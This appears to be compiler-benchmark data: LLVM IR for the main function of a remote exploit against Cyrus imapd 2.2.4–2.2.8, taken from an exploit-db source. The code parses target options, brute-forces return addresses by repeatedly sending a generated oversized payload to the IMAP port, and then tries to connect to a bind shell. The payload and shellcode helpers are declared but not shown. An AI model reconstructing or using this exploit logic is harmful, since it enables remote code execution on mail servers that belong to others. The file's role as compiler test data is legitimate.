; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_903.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_903.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32 }
%struct.sockaddr_in = type { i32 }

@SHELL_PORT = common dso_local global i8* null, align 8
@RET_BF_START = common dso_local global i32 0, align 4
@RET_BF_END = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [66 x i8] c"[!] Cyrus imapd 2.2.4 - 2.2.8 remote exploit by crash-x / unl0ck\0A\00", align 1
@.str.1 = private unnamed_addr constant [17 x i8] c"h:p:t:s:P:S:E:vV\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [24 x i8] c"[-] Port %d is invalid\0A\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.3 = private unnamed_addr constant [35 x i8] c"[-] Wtf are you trying to target?\0A\00", align 1
@.str.4 = private unnamed_addr constant [53 x i8] c"[-] Wtf thats not a valid bruteforce start address!\0A\00", align 1
@.str.5 = private unnamed_addr constant [51 x i8] c"[-] Wtf thats not a valid bruteforce end address!\0A\00", align 1
@.str.6 = private unnamed_addr constant [67 x i8] c"[-] Its a bad idea to have a payload with less than 1000 bytes :)\0A\00", align 1
@.str.7 = private unnamed_addr constant [51 x i8] c"[-] Wasnt able to allocate space for the payload!\0A\00", align 1
@.str.8 = private unnamed_addr constant [18 x i8] c"[!] Targeting %s\0A\00", align 1
@.str.9 = private unnamed_addr constant [33 x i8] c"[!] Starting bruteforce attack!\0A\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.11 = private unnamed_addr constant [24 x i8] c"[-] Connecting failed!\0A\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"%s\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"[-]\0A\00", align 1
@.str.14 = private unnamed_addr constant [21 x i8] c"[-] Exploit failed!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [1024 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %6, align 8
  store i8* null, i8** %7, align 8
  store i32 0, i32* %14, align 4
  store i32 143, i32* %15, align 4
  %24 = load i8*, i8** @SHELL_PORT, align 8
  %25 = call i32 @atoi(i8* %24)
  store i32 %25, i32* %16, align 4
  store i32 1, i32* %17, align 4
  store i32 10000, i32* %18, align 4
  %26 = load i32, i32* @RET_BF_START, align 4
  store i32 %26, i32* %19, align 4
  %27 = load i32, i32* @RET_BF_END, align 4
  store i32 %27, i32* %20, align 4
  store i32 1, i32* %21, align 4
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str, i64 0, i64 0))
  %29 = load i32, i32* %4, align 4
  %30 = icmp slt i32 %29, 2
  br i1 %30, label %31, label %36

31:                                               ; preds = %2
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @usage(i8* %34)
  br label %36

36:                                               ; preds = %31, %2
  br label %37

37:                                               ; preds = %129, %36
  %38 = load i32, i32* %4, align 4
  %39 = load i8**, i8*** %5, align 8
  %40 = call i32 @getopt(i32 %38, i8** %39, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  store i32 %40, i32* %13, align 4
  %41 = icmp ne i32 %40, -1
  br i1 %41, label %42, label %130

42:                                               ; preds = %37
  %43 = load i32, i32* %13, align 4
  switch i32 %43, label %124 [
    i32 104, label %44
    i32 112, label %46
    i32 116, label %58
    i32 83, label %87
    i32 69, label %99
    i32 115, label %111
    i32 80, label %114
    i32 118, label %122
    i32 86, label %123
  ]

44:                                               ; preds = %42
  %45 = load i8*, i8** @optarg, align 8
  store i8* %45, i8** %7, align 8
  br label %129

46:                                               ; preds = %42
  %47 = load i8*, i8** @optarg, align 8
  %48 = call i32 @atoi(i8* %47)
  store i32 %48, i32* %15, align 4
  %49 = load i32, i32* %15, align 4
  %50 = icmp sgt i32 %49, 65535
  br i1 %50, label %54, label %51

51:                                               ; preds = %46
  %52 = load i32, i32* %15, align 4
  %53 = icmp slt i32 %52, 1
  br i1 %53, label %54, label %57

54:                                               ; preds = %51, %46
  %55 = load i32, i32* %15, align 4
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i32 %55)
  store i32 1, i32* %3, align 4
  br label %271

57:                                               ; preds = %51
  br label %129

58:                                               ; preds = %42
  %59 = load i8*, i8** @optarg, align 8
  %60 = call i32 @atoi(i8* %59)
  store i32 %60, i32* %14, align 4
  store i32 0, i32* %10, align 4
  br label %61

61:                                               ; preds = %70, %58
  %62 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %63 = load i32, i32* %10, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %62, i64 %64
  %66 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %65, i32 0, i32 0
  %67 = load i8*, i8** %66, align 8
  %68 = icmp ne i8* %67, null
  br i1 %68, label %69, label %73

69:                                               ; preds = %61
  br label %70

70:                                               ; preds = %69
  %71 = load i32, i32* %10, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %10, align 4
  br label %61

73:                                               ; preds = %61
  %74 = load i32, i32* %14, align 4
  %75 = load i32, i32* %10, align 4
  %76 = icmp sge i32 %74, %75
  br i1 %76, label %77, label %86

77:                                               ; preds = %73
  %78 = load i32, i32* %14, align 4
  %79 = icmp ne i32 %78, 1337
  br i1 %79, label %80, label %86

80:                                               ; preds = %77
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0))
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 0
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @usage(i8* %84)
  br label %86

86:                                               ; preds = %80, %77, %73
  br label %129

87:                                               ; preds = %42
  %88 = load i8*, i8** @optarg, align 8
  %89 = call i32 @strtoul(i8* %88, i32* null, i32 0)
  store i32 %89, i32* %19, align 4
  %90 = load i32, i32* %19, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %98, label %92

92:                                               ; preds = %87
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.4, i64 0, i64 0))
  %94 = load i8**, i8*** %5, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 0
  %96 = load i8*, i8** %95, align 8
  %97 = call i32 @usage(i8* %96)
  br label %98

98:                                               ; preds = %92, %87
  br label %129

99:                                               ; preds = %42
  %100 = load i8*, i8** @optarg, align 8
  %101 = call i32 @strtoul(i8* %100, i32* null, i32 0)
  store i32 %101, i32* %20, align 4
  %102 = load i32, i32* %20, align 4
  %103 = icmp ne i32 %102, 0
  br i1 %103, label %110, label %104

104:                                              ; preds = %99
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.5, i64 0, i64 0))
  %106 = load i8**, i8*** %5, align 8
  %107 = getelementptr inbounds i8*, i8** %106, i64 0
  %108 = load i8*, i8** %107, align 8
  %109 = call i32 @usage(i8* %108)
  br label %110

110:                                              ; preds = %104, %99
  br label %129

111:                                              ; preds = %42
  %112 = load i8*, i8** @optarg, align 8
  %113 = call i32 @atoi(i8* %112)
  store i32 %113, i32* %17, align 4
  br label %129

114:                                              ; preds = %42
  %115 = load i8*, i8** @optarg, align 8
  %116 = call i32 @atoi(i8* %115)
  store i32 %116, i32* %18, align 4
  %117 = load i32, i32* %18, align 4
  %118 = icmp slt i32 %117, 1000
  br i1 %118, label %119, label %121

119:                                              ; preds = %114
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %271

121:                                              ; preds = %114
  br label %129

122:                                              ; preds = %42
  store i32 2, i32* %21, align 4
  br label %129

123:                                              ; preds = %42
  store i32 0, i32* %21, align 4
  br label %129

124:                                              ; preds = %42
  %125 = load i8**, i8*** %5, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 0
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @usage(i8* %127)
  br label %129

129:                                              ; preds = %124, %123, %122, %121, %111, %110, %98, %86, %57, %44
  br label %37

130:                                              ; preds = %37
  %131 = load i8*, i8** %7, align 8
  %132 = icmp eq i8* %131, null
  br i1 %132, label %133, label %138

133:                                              ; preds = %130
  %134 = load i8**, i8*** %5, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 0
  %136 = load i8*, i8** %135, align 8
  %137 = call i32 @usage(i8* %136)
  br label %138

138:                                              ; preds = %133, %130
  %139 = load i8*, i8** %6, align 8
  %140 = icmp eq i8* %139, null
  br i1 %140, label %141, label %148

141:                                              ; preds = %138
  %142 = load i32, i32* %18, align 4
  %143 = call i8* @malloc(i32 %142)
  store i8* %143, i8** %6, align 8
  %144 = icmp ne i8* %143, null
  br i1 %144, label %147, label %145

145:                                              ; preds = %141
  %146 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.7, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %271

147:                                              ; preds = %141
  br label %148

148:                                              ; preds = %147, %138
  %149 = load i8*, i8** %7, align 8
  %150 = call i32 @resolv(%struct.sockaddr_in* %23, i8* %149)
  %151 = load i32, i32* %21, align 4
  %152 = icmp eq i32 %151, 2
  br i1 %152, label %153, label %158

153:                                              ; preds = %148
  %154 = load i32, i32* %15, align 4
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 0
  %156 = load i32, i32* %155, align 4
  %157 = call i32 @vulnchck(i32 %156, i32 %154)
  store i32 1, i32* %3, align 4
  br label %271

158:                                              ; preds = %148
  %159 = load i32, i32* %21, align 4
  %160 = icmp eq i32 %159, 1
  br i1 %160, label %161, label %166

161:                                              ; preds = %158
  %162 = load i32, i32* %15, align 4
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 0
  %164 = load i32, i32* %163, align 4
  %165 = call i32 @vulnchck(i32 %164, i32 %162)
  br label %166

166:                                              ; preds = %161, %158
  br label %167

167:                                              ; preds = %166
  %168 = load i32, i32* %14, align 4
  %169 = icmp ne i32 %168, 1337
  br i1 %169, label %170, label %191

170:                                              ; preds = %167
  %171 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %172 = load i32, i32* %14, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %171, i64 %173
  %175 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %174, i32 0, i32 1
  %176 = load i32, i32* %175, align 8
  store i32 %176, i32* %19, align 4
  %177 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %178 = load i32, i32* %14, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %177, i64 %179
  %181 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %180, i32 0, i32 1
  %182 = load i32, i32* %181, align 8
  %183 = add nsw i32 %182, 5
  store i32 %183, i32* %20, align 4
  %184 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %185 = load i32, i32* %14, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %184, i64 %186
  %188 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %187, i32 0, i32 0
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.8, i64 0, i64 0), i8* %189)
  br label %193

191:                                              ; preds = %167
  %192 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.9, i64 0, i64 0))
  br label %193

193:                                              ; preds = %191, %170
  store i32 0, i32* %10, align 4
  store i32 1, i32* %11, align 4
  br label %194

194:                                              ; preds = %264, %193
  %195 = load i32, i32* %19, align 4
  %196 = load i32, i32* %20, align 4
  %197 = icmp slt i32 %195, %196
  br i1 %197, label %198, label %269

198:                                              ; preds = %194
  %199 = load i32, i32* %15, align 4
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 0
  %201 = load i32, i32* %200, align 4
  %202 = call i32 @conn(i32 %201, i32 %199)
  store i32 %202, i32* %12, align 4
  %203 = icmp eq i32 %202, -1
  br i1 %203, label %204, label %211

204:                                              ; preds = %198
  %205 = load i32, i32* %11, align 4
  %206 = icmp ne i32 %205, 1
  br i1 %206, label %207, label %209

207:                                              ; preds = %204
  %208 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  br label %209

209:                                              ; preds = %207, %204
  %210 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.11, i64 0, i64 0))
  br label %269

211:                                              ; preds = %198
  %212 = load i32, i32* %10, align 4
  %213 = icmp eq i32 %212, 4
  br i1 %213, label %214, label %221

214:                                              ; preds = %211
  %215 = load i32, i32* %18, align 4
  %216 = load i32, i32* %18, align 4
  %217 = sdiv i32 %216, 10
  %218 = sub nsw i32 %215, %217
  %219 = load i32, i32* %19, align 4
  %220 = add nsw i32 %219, %218
  store i32 %220, i32* %19, align 4
  br label %224

221:                                              ; preds = %211
  %222 = load i32, i32* %19, align 4
  %223 = add nsw i32 %222, 1
  store i32 %223, i32* %19, align 4
  br label %224

224:                                              ; preds = %221, %214
  %225 = load i8*, i8** %6, align 8
  %226 = load i32, i32* %18, align 4
  %227 = load i32, i32* %19, align 4
  %228 = call i32 @gen_payload(i8* %225, i32 %226, i32 %227, i32 1)
  %229 = load i32, i32* %19, align 4
  %230 = load i32, i32* %19, align 4
  %231 = load i32, i32* %18, align 4
  %232 = load i32, i32* %18, align 4
  %233 = sdiv i32 %232, 10
  %234 = sub nsw i32 %231, %233
  %235 = add nsw i32 %230, %234
  %236 = load i32, i32* %19, align 4
  %237 = load i32, i32* %18, align 4
  %238 = load i32, i32* %18, align 4
  %239 = sdiv i32 %238, 10
  %240 = sdiv i32 %239, 2
  %241 = sub nsw i32 %237, %240
  %242 = add nsw i32 %236, %241
  %243 = call i32 @status(i32 %229, i32 %235, i32 %242)
  %244 = load i32, i32* %12, align 4
  %245 = load i8*, i8** %6, align 8
  %246 = call i32 @sockprintf(i32 %244, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i8* %245)
  %247 = load i32, i32* %10, align 4
  %248 = icmp eq i32 %247, 4
  br i1 %248, label %249, label %255

249:                                              ; preds = %224
  %250 = load i32, i32* %16, align 4
  %251 = load i32, i32* %17, align 4
  %252 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 0
  %253 = load i32, i32* %252, align 4
  %254 = call i32 @get_shell(i32 %253, i32 %250, i32 %251)
  store i32 0, i32* %10, align 4
  br label %255

255:                                              ; preds = %249, %224
  %256 = load i32, i32* %19, align 4
  %257 = load i32, i32* %20, align 4
  %258 = icmp sge i32 %256, %257
  br i1 %258, label %259, label %261

259:                                              ; preds = %255
  %260 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0))
  br label %261

261:                                              ; preds = %259, %255
  %262 = load i32, i32* %12, align 4
  %263 = call i32 @close(i32 %262)
  br label %264

264:                                              ; preds = %261
  %265 = load i32, i32* %10, align 4
  %266 = add nsw i32 %265, 1
  store i32 %266, i32* %10, align 4
  %267 = load i32, i32* %11, align 4
  %268 = add nsw i32 %267, 1
  store i32 %268, i32* %11, align 4
  br label %194

269:                                              ; preds = %209, %194
  %270 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.14, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %271

271:                                              ; preds = %269, %153, %145, %119, %54
  %272 = load i32, i32* %3, align 4
  ret i32 %272
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strtoul(i8*, i32*, i32) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @resolv(%struct.sockaddr_in*, i8*) #1

declare dso_local i32 @vulnchck(i32, i32) #1

declare dso_local i32 @conn(i32, i32) #1

declare dso_local i32 @gen_payload(i8*, i32, i32, i32) #1

declare dso_local i32 @status(i32, i32, i32) #1

declare dso_local i32 @sockprintf(i32, i8*, i8*) #1

declare dso_local i32 @get_shell(i32, i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
